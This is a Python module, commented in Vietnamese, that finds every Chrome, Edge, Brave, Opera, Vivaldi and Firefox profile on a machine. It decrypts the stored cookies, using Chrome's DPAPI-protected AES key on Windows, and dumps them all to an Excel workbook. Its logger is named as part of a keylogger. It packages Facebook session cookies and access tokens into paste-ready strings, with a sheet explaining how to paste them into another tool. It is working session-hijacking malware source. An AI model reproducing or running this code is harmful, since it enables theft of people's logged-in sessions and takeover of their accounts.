#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module trích xuất cookie từ các trình duyệt phổ biến
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import datetime
import tempfile
import platform
import traceback
import logging
from typing import List, Dict, Any, Optional, Tuple, Union
from pathlib import Path

# Kiểm tra và import thư viện cần thiết
try:
    import openpyxl
    from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
    from openpyxl.utils import get_column_letter
except ImportError:
    logging.error("Thư viện openpyxl chưa được cài đặt. Đang cài đặt...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "openpyxl"])
    import openpyxl
    from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
    from openpyxl.utils import get_column_letter

# Module để giải mã cookie Chrome
try:
    import win32crypt
except ImportError:
    if platform.system() == "Windows":
        logging.error("Thư viện pywin32 chưa được cài đặt. Đang cài đặt...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
        import win32crypt
    else:
        win32crypt = None

# Module để giải mã AES
try:
    from Crypto.Cipher import AES
except ImportError:
    logging.error("Thư viện pycryptodome chưa được cài đặt. Đang cài đặt...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
    from Crypto.Cipher import AES


class BrowserCookieExtractor:
    """Class trích xuất cookie từ các trình duyệt phổ biến."""

    def __init__(self, db_path=None):
        """Khởi tạo trình trích xuất cookie.

        Args:
            db_path: Đường dẫn đến cơ sở dữ liệu để lưu thông tin
        """
        self.logger = logging.getLogger("keylogger.cookie_extractor")
        self.db_path = db_path

        # Lưu các thông tin trình duyệt đã quét
        self.browser_info = {}

        # Danh sách cookie đã thu thập
        self.cookies = []

        # Kết quả truy vấn
        self.result = {
            "success": False,
            "message": "",
            "browsers": {},
            "total_cookies": 0,
            "unique_domains": set(),
            "excel_path": ""
        }

    def get_chrome_based_paths(self) -> Dict[str, List[Dict[str, str]]]:
        """Lấy đường dẫn đến các file cookie của trình duyệt dựa trên Chromium.
        
        Returns:
            Dict[str, List[Dict[str, str]]]: Thông tin đường dẫn của các trình duyệt Chromium
        """
        paths = {}

        user_data_paths = {
            "Chrome": "",
            "Edge": "",
            "Brave": "",
            "Opera": "",
            "Vivaldi": "",
        }

        if platform.system() == "Windows":
            # Đường dẫn mặc định trên Windows
            appdata = os.environ.get('LOCALAPPDATA', '')
            user_data_paths = {
                "Chrome": os.path.join(appdata, "Google", "Chrome", "User Data"),
                "Edge": os.path.join(appdata, "Microsoft", "Edge", "User Data"),
                "Brave": os.path.join(appdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
                "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(appdata, "Vivaldi", "User Data"),
            }
        elif platform.system() == "Darwin":  # macOS
            home = os.path.expanduser("~")
            user_data_paths = {
                "Chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
                "Edge": os.path.join(home, "Library", "Application Support", "Microsoft Edge"),
                "Brave": os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
                "Opera": os.path.join(home, "Library", "Application Support", "com.operasoftware.Opera"),
                "Opera GX": os.path.join(home, "Library", "Application Support", "com.operasoftware.OperaGX"),
                "Vivaldi": os.path.join(home, "Library", "Application Support", "Vivaldi"),
            }
        elif platform.system() == "Linux":
            home = os.path.expanduser("~")
            user_data_paths = {
                "Chrome": os.path.join(home, ".config", "google-chrome"),
                "Chromium": os.path.join(home, ".config", "chromium"),
                "Edge": os.path.join(home, ".config", "microsoft-edge"),
                "Brave": os.path.join(home, ".config", "BraveSoftware", "Brave-Browser"),
                "Opera": os.path.join(home, ".config", "opera"),
                "Vivaldi": os.path.join(home, ".config", "vivaldi"),
            }

        # Thu thập đường dẫn đến file Cookies và Local State
        for browser, base_path in user_data_paths.items():
            if os.path.exists(base_path):
                browser_paths = []

                # Chrome, Edge, Brave, Vivaldi lưu trong thư mục profile (Default, Profile 1, ...)
                if browser in ["Chrome", "Edge", "Brave", "Vivaldi", "Chromium"]:
                    # Tìm tất cả thư mục profile
                    profiles = ["Default"]
                    for item in os.listdir(base_path):
                        if item.startswith("Profile ") and os.path.isdir(os.path.join(base_path, item)):
                            profiles.append(item)

                    # Thêm đường dẫn đến file Cookies của từng profile
                    for profile in profiles:
                        cookie_path = os.path.join(base_path, profile, "Network", "Cookies")
                        if os.path.exists(cookie_path):
                            # Đường dẫn file Cookies và file Local State cho việc giải mã
                            local_state_path = os.path.join(base_path, "Local State")
                            browser_paths.append({
                                "profile": profile,
                                "cookie_path": cookie_path,
                                "local_state_path": local_state_path
                            })

                # Opera, Opera GX có cấu trúc hơi khác
                elif browser in ["Opera", "Opera GX"]:
                    cookie_path = os.path.join(base_path, "Network", "Cookies")
                    if os.path.exists(cookie_path):
                        local_state_path = os.path.join(base_path, "Local State")
                        browser_paths.append({
                            "profile": "Default",
                            "cookie_path": cookie_path,
                            "local_state_path": local_state_path
                        })

                if browser_paths:
                    paths[browser] = browser_paths

        return paths

    def get_firefox_paths(self) -> Dict[str, List[Dict[str, str]]]:
        """Lấy đường dẫn đến các file cookie của Firefox.
        
        Returns:
            Dict[str, List[Dict[str, str]]]: Thông tin đường dẫn cookie của Firefox
        """
        firefox_paths = {}

        if platform.system() == "Windows":
            firefox_dir = os.path.join(os.environ.get('APPDATA', ''), "Mozilla", "Firefox", "Profiles")
        elif platform.system() == "Darwin":  # macOS
            firefox_dir = os.path.join(os.path.expanduser("~"), "Library", "Application Support", "Firefox", "Profiles")
        elif platform.system() == "Linux":
            firefox_dir = os.path.join(os.path.expanduser("~"), ".mozilla", "firefox")
        else:
            return {}

        if not os.path.exists(firefox_dir):
            return {}

        # Tìm tất cả profile Firefox
        profiles = []
        try:
            if platform.system() == "Linux":
                firefox_dir = os.path.join(firefox_dir, "profiles.ini")
                if os.path.exists(firefox_dir):
                    # Đọc profiles.ini để lấy thông tin profile
                    with open(firefox_dir, 'r') as f:
                        profile_data = f.read()

                    # Parse profiles.ini
                    sections = profile_data.split('[')[1:]
                    for section in sections:
                        if section.startswith('Profile'):
                            lines = section.split('\n')
                            path = None
                            is_relative = None

                            for line in lines:
                                if '=' in line:
                                    key, value = line.split('=', 1)
                                    if key.strip() == 'Path':
                                        path = value.strip()
                                    elif key.strip() == 'IsRelative':
                                        is_relative = value.strip() == '1'

                            if path and is_relative is not None:
                                if is_relative:
                                    full_path = os.path.join(os.path.expanduser("~"), ".mozilla", "firefox", path)
                                else:
                                    full_path = path

                                if os.path.exists(full_path):
                                    profiles.append(full_path)
            else:
                # Windows và macOS
                for item in os.listdir(firefox_dir):
                    if item.endswith(".default") or ".default-" in item:
                        profiles.append(os.path.join(firefox_dir, item))
        except Exception as e:
            self.logger.error(f"Lỗi khi tìm profile Firefox: {e}")

        # Kiểm tra file cookies.sqlite trong mỗi profile
        firefox_paths["Firefox"] = []
        for profile in profiles:
            cookie_path = os.path.join(profile, "cookies.sqlite")
            if os.path.exists(cookie_path):
                firefox_paths["Firefox"].append({
                    "profile": os.path.basename(profile),
                    "cookie_path": cookie_path
                })

        return firefox_paths

    def get_chrome_encryption_key(self, local_state_path: str) -> Optional[bytes]:
        """Lấy khóa giải mã AES từ file Local State của Chrome.
        
        Args:
            local_state_path: Đường dẫn đến file Local State
        
        Returns:
            Optional[bytes]: Khóa giải mã dạng bytes hoặc None nếu không thể lấy
        """
        try:
            if not os.path.exists(local_state_path):
                return None

            # Đọc file Local State
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())

            # Lấy encrypted_key
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

            # Bỏ prefix 'DPAPI'
            encrypted_key = encrypted_key[5:]

            # Giải mã bằng CryptUnprotectData trên Windows
            if platform.system() == "Windows" and win32crypt:
                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return decrypted_key
            else:
                # Các OS khác cần phương pháp riêng nhưng chưa triển khai trong demo này
                return None
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy khóa giải mã Chrome: {e}")
            return None

    def decrypt_chrome_cookie(self, encrypted_value: bytes, key: bytes) -> str:
        """Giải mã giá trị cookie của Chrome/Edge bằng AES-GCM.
        
        Args:
            encrypted_value: Giá trị cookie đã mã hóa
            key: Khóa giải mã
        
        Returns:
            str: Giá trị cookie đã giải mã
        """
        try:
            # Cấu trúc của dữ liệu mã hóa: v10 [nonce(12 bytes)] [ciphertext] [tag (16 bytes)]
            if not encrypted_value.startswith(b'v10'):
                # Thử giải mã bằng CryptUnprotectData (phương pháp cũ)
                if platform.system() == "Windows" and win32crypt:
                    try:
                        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
                    except:
                        return ""
                return ""

            # Giải mã bằng AES-GCM (phương pháp từ Chrome 80+)
            nonce = encrypted_value[3:3 + 12]
            ciphertext = encrypted_value[3 + 12:-16]
            tag = encrypted_value[-16:]

            # Tạo cipher AES-GCM
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

            # Giải mã và xác thực
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode('utf-8')

        except Exception as e:
            self.logger.error(f"Lỗi khi giải mã cookie Chrome: {e}")
            return ""

    def extract_chrome_cookies(self, cookie_info: Dict[str, str], browser_name: str) -> List[Dict[str, Any]]:
        """Trích xuất cookie từ trình duyệt dựa trên Chromium (Chrome, Edge, Brave...).
        
        Args:
            cookie_info: Thông tin đường dẫn cookie
            browser_name: Tên trình duyệt
        
        Returns:
            List[Dict[str, Any]]: Danh sách cookie đã trích xuất
        """
        cookies = []

        try:
            cookie_path = cookie_info["cookie_path"]
            profile = cookie_info["profile"]
            local_state_path = cookie_info["local_state_path"]

            # Tạo bản sao tạm thời của file cookie để tránh lỗi nếu trình duyệt đang mở
            temp_dir = tempfile.mkdtemp()
            temp_cookie_path = os.path.join(temp_dir, "Cookies_temp")

            try:
                shutil.copy2(cookie_path, temp_cookie_path)

                # Lấy khóa giải mã
                encryption_key = self.get_chrome_encryption_key(local_state_path)

                # Kết nối đến file cookie
                conn = sqlite3.connect(temp_cookie_path)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()

                # Truy vấn cookie
                cursor.execute(
                    """
                    SELECT host_key, name, value, path, expires_utc, is_secure,
                           is_httponly, creation_utc, last_access_utc,
                           encrypted_value
                    FROM cookies
                    """
                )

                # Thời gian cơ sở của Chrome: 01/01/1601 00:00:00
                chrome_epoch = datetime.datetime(1601, 1, 1)

                for row in cursor:
                    host = row["host_key"]
                    name = row["name"]
                    path = row["path"]
                    is_secure = bool(row["is_secure"])
                    is_httponly = bool(row["is_httponly"])

                    # Chuyển đổi thời gian từ microseconds kể từ epoch của Chrome
                    if row["expires_utc"]:
                        expires = chrome_epoch + datetime.timedelta(microseconds=row["expires_utc"])
                    else:
                        expires = None

                    if row["creation_utc"]:
                        created = chrome_epoch + datetime.timedelta(microseconds=row["creation_utc"])
                    else:
                        created = None

                    if row["last_access_utc"]:
                        last_access = chrome_epoch + datetime.timedelta(microseconds=row["last_access_utc"])
                    else:
                        last_access = None

                    # Giải mã giá trị cookie
                    if encryption_key and row["encrypted_value"]:
                        value = self.decrypt_chrome_cookie(row["encrypted_value"], encryption_key)
                    else:
                        value = row["value"]

                    # Thêm cookie vào danh sách
                    cookies.append({
                        "browser": browser_name,
                        "profile": profile,
                        "domain": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expires.isoformat() if expires else "Session",
                        "created": created.isoformat() if created else "",
                        "last_accessed": last_access.isoformat() if last_access else "",
                        "secure": is_secure,
                        "httponly": is_httponly
                    })

                cursor.close()
                conn.close()

            finally:
                # Dọn dẹp file tạm
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass

        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất cookie {browser_name} (profile {cookie_info['profile']}): {e}")
            self.logger.error(traceback.format_exc())

        return cookies

    def extract_firefox_cookies(self, cookie_info: Dict[str, str]) -> List[Dict[str, Any]]:
        """Trích xuất cookie từ Firefox.
        
        Args:
            cookie_info: Thông tin đường dẫn cookie
        
        Returns:
            List[Dict[str, Any]]: Danh sách cookie đã trích xuất
        """
        cookies = []

        try:
            cookie_path = cookie_info["cookie_path"]
            profile = cookie_info["profile"]

            # Tạo bản sao tạm thời của file cookie
            temp_dir = tempfile.mkdtemp()
            temp_cookie_path = os.path.join(temp_dir, "cookies_temp.sqlite")

            try:
                shutil.copy2(cookie_path, temp_cookie_path)

                # Kết nối đến file cookie
                conn = sqlite3.connect(temp_cookie_path)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()

                # Truy vấn cookie
                cursor.execute(
                    """
                    SELECT host, name, value, path, expiry, isSecure,
                           isHttpOnly, creationTime, lastAccessed
                    FROM moz_cookies
                    """
                )

                for row in cursor:
                    host = row["host"]
                    name = row["name"]
                    value = row["value"]
                    path = row["path"]
                    is_secure = bool(row["isSecure"])
                    is_httponly = bool(row["isHttpOnly"])

                    # Chuyển đổi thời gian từ seconds kể từ epoch của Unix (01/01/1970)
                    if row["expiry"]:
                        expires = datetime.datetime.fromtimestamp(row["expiry"])
                    else:
                        expires = None

                    # Firefox lưu thời gian dưới dạng microseconds kể từ 01/01/1970
                    if row["creationTime"]:
                        created = datetime.datetime.fromtimestamp(row["creationTime"] / 1000000)
                    else:
                        created = None

                    if row["lastAccessed"]:
                        last_access = datetime.datetime.fromtimestamp(row["lastAccessed"] / 1000000)
                    else:
                        last_access = None

                    # Thêm cookie vào danh sách
                    cookies.append({
                        "browser": "Firefox",
                        "profile": profile,
                        "domain": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expires.isoformat() if expires else "Session",
                        "created": created.isoformat() if created else "",
                        "last_accessed": last_access.isoformat() if last_access else "",
                        "secure": is_secure,
                        "httponly": is_httponly
                    })

                cursor.close()
                conn.close()

            finally:
                # Dọn dẹp file tạm
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass

        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất cookie Firefox (profile {profile}): {e}")
            self.logger.error(traceback.format_exc())

        return cookies

    def export_to_excel(self, filepath: str) -> bool:
        """Xuất danh sách cookie ra file Excel.
        
        Args:
            filepath: Đường dẫn file Excel xuất ra
        
        Returns:
            bool: True nếu xuất thành công, False nếu có lỗi
        """
        try:
            if not self.cookies:
                self.logger.warning("Không có cookie nào để xuất ra Excel")
                return False

            # Tạo workbook mới
            wb = openpyxl.Workbook()

            # Xóa sheet mặc định
            if "Sheet" in wb.sheetnames:
                wb.remove(wb["Sheet"])

            # Thêm sheet tổng quan
            summary_sheet = wb.create_sheet("Tổng quan")

            # Dòng tiêu đề tổng quan
            summary_sheet.append(["TỔNG QUAN COOKIE TRÌNH DUYỆT"])
            summary_sheet.append(["Ngày trích xuất", datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")])
            summary_sheet.append(["Tổng số cookie", len(self.cookies)])

            # Đếm số domain
            domain_count = len(self.result["unique_domains"])
            summary_sheet.append(["Số domain", domain_count])

            # Tạo bảng thống kê theo trình duyệt
            summary_sheet.append([])
            summary_sheet.append(["THỐNG KÊ THEO TRÌNH DUYỆT"])
            summary_sheet.append(["Trình duyệt", "Profile", "Số cookie"])

            browser_stats = {}
            for cookie in self.cookies:
                browser = cookie["browser"]
                profile = cookie["profile"]
                key = f"{browser} - {profile}"

                if key not in browser_stats:
                    browser_stats[key] = 0
                browser_stats[key] += 1

            for key, count in browser_stats.items():
                browser, profile = key.split(" - ", 1)
                summary_sheet.append([browser, profile, count])

            # Định dạng sheet tổng quan
            # Tiêu đề
            summary_sheet["A1"].font = Font(bold=True, size=14)
            summary_sheet.merge_cells("A1:C1")
            summary_sheet["A1"].alignment = Alignment(horizontal="center")

            # Tiêu đề phần thống kê
            summary_sheet["A6"].font = Font(bold=True, size=12)
            summary_sheet.merge_cells("A6:C6")
            summary_sheet["A6"].alignment = Alignment(horizontal="center")

            # Tiêu đề bảng
            for col in ["A7", "B7", "C7"]:
                summary_sheet[col].font = Font(bold=True)
                summary_sheet[col].fill = PatternFill(start_color="D9D9D9", end_color="D9D9D9", fill_type="solid")

            # Điều chỉnh độ rộng cột
            for col in range(1, 4):
                summary_sheet.column_dimensions[get_column_letter(col)].width = 20

            # Nhóm cookie theo domain
            domain_cookies = {}
            for cookie in self.cookies:
                domain = cookie["domain"]
                if domain not in domain_cookies:
                    domain_cookies[domain] = []
                domain_cookies[domain].append(cookie)

            # Sắp xếp domains theo số lượng cookie (giảm dần)
            sorted_domains = sorted(domain_cookies.items(), key=lambda x: len(x[1]), reverse=True)

            # Tạo từ điển để lưu chuỗi cookie tổng hợp cho mỗi domain
            domain_cookie_strings = {}
            for domain, cookies in domain_cookies.items():
                # Format thông thường cho các domain
                cookie_parts = []
                for cookie in cookies:
                    if cookie["name"] and cookie["value"]:
                        cookie_parts.append(f"{cookie['name']}={cookie['value']}")

                # Trường hợp đặc biệt cho Facebook - sử dụng định dạng đặc biệt với dấu |
                if "facebook.com" in domain:
                    # Tạo phần trước dấu |
                    facebook_cookies = []
                    special_cookies = ["c_user", "xs", "fr", "datr"]
                    # Ưu tiên các cookie quan trọng
                    for cookie in cookies:
                        if cookie["name"] in special_cookies and cookie["value"]:
                            facebook_cookies.append(f"{cookie['name']}={cookie['value']}")

                    cookie_string = ";".join(facebook_cookies)

                    # Thêm phần sau dấu |
                    token_part = "EAAAAUaZA8jlABO..."  # Placeholder cho token mặc định

                    # Tìm cookie access_token nếu có
                    for cookie in cookies:
                        if cookie["name"] == "access_token" and cookie["value"]:
                            token_part = cookie["value"]
                            break

                    cookie_string += f"|{token_part}"
                else:
                    # Format thông thường cho các domain khác
                    cookie_string = ";".join(cookie_parts)

                domain_cookie_strings[domain] = cookie_string

            # Tạo sheet chính cho tất cả cookie
            main_sheet = wb.create_sheet("Tất cả cookie")

            # Thêm header
            headers = [
                "Trình duyệt", "Profile", "Domain", "Tên cookie", "Giá trị",
                "Đường dẫn", "Thời gian tạo", "Truy cập cuối", "Hết hạn", "Secure", "HttpOnly", "COOKIES TỔNG"
            ]
            main_sheet.append(headers)

            # Thêm dữ liệu
            for cookie in self.cookies:
                domain = cookie["domain"]
                # Lấy chuỗi cookie tổng hợp cho domain này
                cookie_string = domain_cookie_strings.get(domain, "")

                row = [
                    cookie["browser"],
                    cookie["profile"],
                    cookie["domain"],
                    cookie["name"],
                    cookie["value"],
                    cookie["path"],
                    cookie["created"],
                    cookie["last_accessed"],
                    cookie["expires"],
                    "Có" if cookie["secure"] else "Không",
                    "Có" if cookie["httponly"] else "Không",
                    cookie_string  # Thêm chuỗi cookie tổng hợp
                ]
                main_sheet.append(row)

            # Định dạng sheet chính
            # Header
            for col in range(1, len(headers) + 1):
                cell = main_sheet.cell(row=1, column=col)
                cell.font = Font(bold=True)
                cell.fill = PatternFill(start_color="4472C4", end_color="4472C4", fill_type="solid")
                cell.font = Font(bold=True, color="FFFFFF")

            # Điều chỉnh độ rộng cột
            column_widths = {
                1: 15,  # Trình duyệt
                2: 12,  # Profile
                3: 30,  # Domain
                4: 25,  # Tên cookie
                5: 40,  # Giá trị
                6: 15,  # Đường dẫn
                7: 20,  # Thời gian tạo
                8: 20,  # Truy cập cuối
                9: 20,  # Hết hạn
                10: 10,  # Secure
                11: 10,  # HttpOnly
                12: 100  # COOKIES TỔNG
            }

            for col, width in column_widths.items():
                main_sheet.column_dimensions[get_column_letter(col)].width = width

            # Tạo một sheet cho mỗi domain phổ biến (có ít nhất 5 cookie)
            for domain, cookies in sorted_domains:
                if len(cookies) >= 5:
                    # Tạo tên sheet hợp lệ (tối đa 31 ký tự, không chứa ký tự đặc biệt)
                    safe_name = "".join(c for c in domain if c.isalnum() or c in "._- ")
                    safe_name = safe_name.replace(".", "_")
                    if len(safe_name) > 31:
                        safe_name = safe_name[:28] + "..."

                    # Đảm bảo không trùng tên sheet
                    sheet_name = safe_name
                    counter = 1
                    while sheet_name in wb.sheetnames:
                        sheet_name = f"{safe_name[:25]}_{counter}"
                        counter += 1

                    # Tạo sheet
                    domain_sheet = wb.create_sheet(sheet_name)

                    # Thêm tiêu đề
                    domain_sheet.append([f"COOKIE CHO DOMAIN: {domain}"])
                    domain_sheet.append([f"Số cookie: {len(cookies)}"])
                    domain_sheet.append([f"Cookie String: {domain_cookie_strings[domain]}"])
                    domain_sheet.append([])

                    # Thêm header
                    domain_sheet.append([
                        "Trình duyệt", "Profile", "Tên cookie", "Giá trị",
                        "Đường dẫn", "Thời gian tạo", "Truy cập cuối", "Hết hạn", "Secure", "HttpOnly"
                    ])

                    # Thêm dữ liệu
                    for cookie in cookies:
                        domain_sheet.append([
                            cookie["browser"],
                            cookie["profile"],
                            cookie["name"],
                            cookie["value"],
                            cookie["path"],
                            cookie["created"],
                            cookie["last_accessed"],
                            cookie["expires"],
                            "Có" if cookie["secure"] else "Không",
                            "Có" if cookie["httponly"] else "Không"
                        ])

                    # Định dạng sheet
                    # Tiêu đề
                    domain_sheet["A1"].font = Font(bold=True, size=12)
                    domain_sheet.merge_cells("A1:J1")
                    domain_sheet["A1"].alignment = Alignment(horizontal="center")

                    # Cookie string
                    domain_sheet["A3"].font = Font(bold=True)
                    domain_sheet.merge_cells("A3:J3")

                    # Header
                    for col in range(1, 11):
                        cell = domain_sheet.cell(row=5, column=col)
                        cell.font = Font(bold=True)
                        cell.fill = PatternFill(start_color="4472C4", end_color="4472C4", fill_type="solid")
                        cell.font = Font(bold=True, color="FFFFFF")

                    # Điều chỉnh độ rộng cột
                    domain_sheet.column_dimensions["A"].width = 15  # Trình duyệt
                    domain_sheet.column_dimensions["B"].width = 12  # Profile
                    domain_sheet.column_dimensions["C"].width = 25  # Tên cookie
                    domain_sheet.column_dimensions["D"].width = 40  # Giá trị
                    domain_sheet.column_dimensions["E"].width = 15  # Đường dẫn
                    domain_sheet.column_dimensions["F"].width = 20  # Thời gian tạo
                    domain_sheet.column_dimensions["G"].width = 20  # Truy cập cuối
                    domain_sheet.column_dimensions["H"].width = 20  # Hết hạn
                    domain_sheet.column_dimensions["I"].width = 10  # Secure
                    domain_sheet.column_dimensions["J"].width = 10  # HttpOnly

            # Tạo sheet cookie string
            string_sheet = wb.create_sheet("Cookie String Format")

            # Thêm tiêu đề
            string_sheet.append(["DOMAIN", "COOKIE STRING"])
            string_sheet["A1"].font = Font(bold=True)
            string_sheet["B1"].font = Font(bold=True)
            string_sheet["A1"].fill = PatternFill(start_color="4472C4", end_color="4472C4", fill_type="solid")
            string_sheet["B1"].fill = PatternFill(start_color="4472C4", end_color="4472C4", fill_type="solid")
            string_sheet["A1"].font = Font(bold=True, color="FFFFFF")
            string_sheet["B1"].font = Font(bold=True, color="FFFFFF")

            # Tạo chuỗi cookie cho mỗi domain
            row_num = 2
            for domain, cookie_string in domain_cookie_strings.items():
                if cookie_string:  # Chỉ thêm nếu có giá trị
                    string_sheet.append([domain, cookie_string])

                    # Alternating row colors
                    bg_color = "F2F2F2" if row_num % 2 == 0 else "FFFFFF"
                    for col in range(1, 3):
                        cell = string_sheet.cell(row=row_num, column=col)
                        cell.fill = PatternFill(start_color=bg_color, end_color=bg_color, fill_type="solid")

                    row_num += 1

            # Thêm hướng dẫn sử dụng
            string_sheet.append([])
            string_sheet.append(["Hướng dẫn:", "Sử dụng chuỗi cookie này để copy vào công cụ"])
            string_sheet.append(["", "1. Chọn domain bạn cần (vd: facebook.com)"])
            string_sheet.append(["", "2. Copy toàn bộ chuỗi ở cột B"])
            string_sheet.append(["", "3. Dán vào công cụ cần sử dụng cookie"])

            # Điều chỉnh độ rộng cột
            string_sheet.column_dimensions["A"].width = 30
            string_sheet.column_dimensions["B"].width = 100

            # Đặt sheet tổng quan là active khi mở file
            wb.active = summary_sheet

            # Lưu workbook
            wb.save(filepath)

            self.logger.info(f"Đã xuất {len(self.cookies)} cookie ra file Excel: {filepath}")
            return True

        except Exception as e:
            self.logger.error(f"Lỗi khi xuất cookie ra Excel: {e}")
            self.logger.error(traceback.format_exc())
            return False

    def extract_all_cookies(self) -> Dict[str, Any]:
        """Trích xuất cookie từ tất cả trình duyệt hỗ trợ.
        
        Returns:
            Dict[str, Any]: Kết quả trích xuất cookie
        """
        self.cookies = []
        self.result = {
            "success": False,
            "message": "",
            "browsers": {},
            "total_cookies": 0,
            "unique_domains": set(),
            "excel_path": ""
        }

        try:
            # Lấy đường dẫn đến trình duyệt dựa trên Chromium
            chrome_paths = self.get_chrome_based_paths()

            # Lấy đường dẫn đến trình duyệt Firefox
            firefox_paths = self.get_firefox_paths()

            # Trích xuất cookie từ các trình duyệt dựa trên Chromium
            for browser_name, cookie_infos in chrome_paths.items():
                self.result["browsers"][browser_name] = {
                    "profiles": [],
                    "cookie_count": 0
                }

                for cookie_info in cookie_infos:
                    profile = cookie_info["profile"]
                    self.logger.info(f"Đang trích xuất cookie từ {browser_name} (profile {profile})...")

                    chrome_cookies = self.extract_chrome_cookies(cookie_info, browser_name)
                    self.cookies.extend(chrome_cookies)

                    self.result["browsers"][browser_name]["profiles"].append({
                        "name": profile,
                        "cookie_count": len(chrome_cookies)
                    })
                    self.result["browsers"][browser_name]["cookie_count"] += len(chrome_cookies)

            # Trích xuất cookie từ Firefox
            for browser_name, cookie_infos in firefox_paths.items():
                self.result["browsers"][browser_name] = {
                    "profiles": [],
                    "cookie_count": 0
                }

                for cookie_info in cookie_infos:
                    profile = cookie_info["profile"]
                    self.logger.info(f"Đang trích xuất cookie từ {browser_name} (profile {profile})...")

                    firefox_cookies = self.extract_firefox_cookies(cookie_info)
                    self.cookies.extend(firefox_cookies)

                    self.result["browsers"][browser_name]["profiles"].append({
                        "name": profile,
                        "cookie_count": len(firefox_cookies)
                    })
                    self.result["browsers"][browser_name]["cookie_count"] += len(firefox_cookies)

            # Thống kê kết quả
            self.result["total_cookies"] = len(self.cookies)

            # Lấy tất cả domain duy nhất
            domains = set()
            for cookie in self.cookies:
                domains.add(cookie["domain"])
            self.result["unique_domains"] = domains

            self.result["success"] = True
            self.result[
                "message"] = f"Đã trích xuất thành công {len(self.cookies)} cookie từ {len(self.result['browsers'])} trình duyệt"

        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất cookie: {e}")
            self.logger.error(traceback.format_exc())
            self.result["success"] = False
            self.result["message"] = f"Lỗi khi trích xuất cookie: {str(e)}"

        return self.result

    def extract_and_export(self, output_dir: str = None) -> Dict[str, Any]:
        """Trích xuất cookie và xuất ra file Excel.
        
        Args:
            output_dir: Thư mục lưu file Excel, mặc định là thư mục hiện tại
        
        Returns:
            Dict[str, Any]: Kết quả trích xuất và xuất file
        """
        try:
            # Trích xuất cookie
            result = self.extract_all_cookies()

            if not result["success"]:
                return result

            # Tạo tên file Excel
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"browser_cookies_{timestamp}.xlsx"

            if output_dir:
                os.makedirs(output_dir, exist_ok=True)
                filepath = os.path.join(output_dir, filename)
            else:
                filepath = filename

            # Xuất ra file Excel
            if self.export_to_excel(filepath):
                self.result["excel_path"] = filepath
                self.result["message"] = f"Đã trích xuất {len(self.cookies)} cookie và xuất ra file Excel: {filepath}"
            else:
                self.result["message"] = f"Đã trích xuất {len(self.cookies)} cookie nhưng không xuất được ra Excel"

            return self.result

        except Exception as e:
            self.logger.error(f"Lỗi khi trích xuất và xuất cookie: {e}")
            self.logger.error(traceback.format_exc())
            return {
                "success": False,
                "message": f"Lỗi khi trích xuất và xuất cookie: {str(e)}",
                "browsers": {},
                "total_cookies": 0,
                "unique_domains": set(),
                "excel_path": ""
            }


def open_excel_file(filepath: str) -> bool:
    """Mở file Excel với ứng dụng mặc định của hệ thống.
    
    Args:
        filepath: Đường dẫn file Excel cần mở
        
    Returns:
        bool: True nếu mở thành công, False nếu thất bại
    """
    try:
        if platform.system() == "Windows":
            os.startfile(filepath)
        elif platform.system() == "Darwin":  # macOS
            subprocess.call(["open", filepath])
        elif platform.system() == "Linux":
            subprocess.call(["xdg-open", filepath])
        return True
    except Exception as e:
        logging.error(f"Lỗi khi mở file Excel: {e}")
        return False


# Hàm tiện ích để trích xuất cookie và xuất ra file Excel
def extract_cookies_to_excel(output_dir: str = None) -> Dict[str, Any]:
    """Trích xuất cookie từ các trình duyệt và xuất ra file Excel.
    
    Args:
        output_dir: Thư mục lưu file Excel, mặc định là thư mục hiện tại
    
    Returns:
        Dict: Kết quả trích xuất và xuất file
    """
    extractor = BrowserCookieExtractor()
    result = extractor.extract_and_export(output_dir)
    
    return result